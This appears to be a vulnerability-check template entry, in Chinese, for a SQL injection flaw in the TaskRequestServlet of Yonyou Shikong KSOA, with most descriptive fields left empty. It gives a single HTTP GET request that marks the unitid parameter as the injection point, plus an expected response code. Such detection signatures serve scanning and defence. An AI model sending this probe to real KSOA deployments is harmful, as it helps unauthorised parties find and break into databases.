﻿# 用友时空 KSOATaskRequestServlet sql注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,  HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友时空 KSOATaskRequestServlet sql注入漏洞.poc
